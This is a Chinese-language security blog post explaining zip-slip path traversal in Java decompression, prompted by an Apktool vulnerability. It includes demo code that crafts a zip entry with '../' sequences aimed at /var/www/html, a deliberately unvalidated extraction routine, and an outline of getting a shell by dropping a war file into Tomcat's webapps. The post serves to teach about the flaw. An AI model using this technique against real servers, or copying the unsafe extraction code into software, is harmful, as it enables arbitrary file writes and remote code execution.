---
layout: post
title: Java文件解压的安全问题   
tags: [Java]
comment: false
---

前几天有文章([传送门](https://research.checkpoint.com/parsedroid-targeting-android-development-research-community/))分析了 Apktool 之前版本存在的两个漏洞，其中第二个漏洞是解包 Apk 时通过类似目录遍历的方式把 unknown 中的脚本解压到线上的网站目录从而实现 RCE。这让我想起了之前一篇讲述 Python 中解压文件时的安全问题的文章([传送门](http://bobao.360.cn/learning/detail/4503.html))，其实 Apktool 这个也是 Java 做文件解压时存在一样的问题了。

### 0x01 Demo 代码

Java 中做压缩/解压操作代码

```java
package ZipTest;

import java.io.*;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;

/**
 * Created by k1n9 on 2017/12/7.
 */
public class Demo {
    public static void main(String[] args) throws Exception {

        ZipCompressSingleFile();
        ZipDecompressFile();

    }

    public static void ZipCompressSingleFile() throws Exception {
        System.out.println(System.getProperty("user.dir"));

        ZipOutputStream zos = new ZipOutputStream(new FileOutputStream("/Users/k1n9/IdeaProjects/JavaLearn/test.zip"));
        ZipEntry entry = new ZipEntry("../../../../../../../../../../../var/www/html/test.txt");
        zos.putNextEntry(entry);

        InputStream is = new FileInputStream("/Users/k1n9/IdeaProjects/JavaLearn/test.txt");
        int len = 0;
        while ((len = is.read()) != -1) {
            zos.write(len);
        }

        is.close();
        zos.close();
    }

    public static void ZipDecompressFile() throws Exception {
        File file = new File("./test.zip");

        ZipFile zf = new ZipFile(file);
        ZipInputStream zis = new ZipInputStream(new FileInputStream(file));
        ZipEntry zipEntry = null;

        while ((zipEntry = zis.getNextEntry()) != null) {
            String filename = zipEntry.getName();
            File f = new File("/Users/k1n9/IdeaProjects/JavaLearn/" + filename);

            if (!f.getParentFile().exists()) {
                f.getParentFile().mkdirs();
            }

            BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(f));
            InputStream is = zf.getInputStream(zipEntry);
            byte[] data = new byte[2048];
            int len = 0;

            while ((len = is.read(data)) != -1) {
                bos.write(data, 0, len);
            }

            bos.close();
            is.close();
        }
        zis.close();
    }
}
```


压缩包中恶意文件路径的构造在实例化 ZipEntry 对象的时候，可以传入往上次目录跳这样的路径，这样压缩后的文件效果如下
![](https://i.loli.net/2017/12/09/5a2b6bb14cbdd.png)

那么在做解压操作时要是没有去验证 ZipEntry 中的文件名是否合法便直接加到路径中写出来的话就会造成文件最终被解压到系统上其它的目录去了。在解压函数中还有一个对父目录的检测的，如果不存在的话就去创建这个父目录，因为真实情况的话往往会创建一个以时间戳来命名的目录再把文件解压到里面去，这里会有个问题，例如

```
/Users/k1n9/IdeaProjects/JavaLearn/test.txt
```
这个是预设中的目标路径，JavaLearn 目录不存在的话便创建一个，这里没啥问题。但是在我们构造一个恶意路径后成了这样

```
/Users/k1n9/IdeaProjects/JavaLearn/../../../../../../../../../../../var/www/html/test.txt
```
这里要是 JavaLearn 目录不存在也不会被创建，由于路径中的 JavaLearn 不存在，在 Linux 文件系统下这样的路径是非法的了，最终会抛出 FileNotFoundException 异常，文件也不会写出来。但是这种情况在 Windows 文件系统中无关系了，一样可以写出来。

### 0x02 如何利用

假如是在 Tomcat 上的话，构造好一个 war 包，路径跳到 webapps。只要解压了，war 包被写到 webapps 目录中，再借助热部署完成 getshell。这只是一个想法了，也可以选择覆盖掉一些配置文件等等。当然要想真正利用还是有前提的：

- 已经获取到了目标的路径（默认或者爆破式的猜也是一些选择了）
- 要是解压路径有加类似时间戳这样的路径就还得考虑目标系统类型了